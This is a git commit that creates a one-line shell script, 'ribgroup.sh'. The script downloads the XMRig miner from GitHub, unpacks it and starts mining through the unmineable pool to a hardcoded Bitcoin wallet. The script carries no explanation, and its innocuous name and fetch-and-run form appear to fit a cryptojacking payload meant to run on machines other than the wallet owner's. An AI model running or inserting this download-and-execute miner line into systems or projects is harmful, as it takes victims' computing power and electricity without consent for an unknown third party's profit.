5ffef64b673e6cc441fc58de589d2351c626419c
killamah <79203180+killamah@users.noreply.github.com>
2022-11-22 21:49:30 +0100

    Create ribgroup.sh

---
+++ ribgroup.sh
@@ -0,0 +1,1 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-bionic-x64.tar.gz && tar xf xmrig-6.10.0-bionic-x64.tar.gz && cd xmrig-6.10.0 && ./xmrig -o rx.unmineable.com:3333 -a rx -k -u BTC:bc1q3s0lkkrkcfjc7ggtmhcqk42m3zp5myzjpe3pxj.rib3
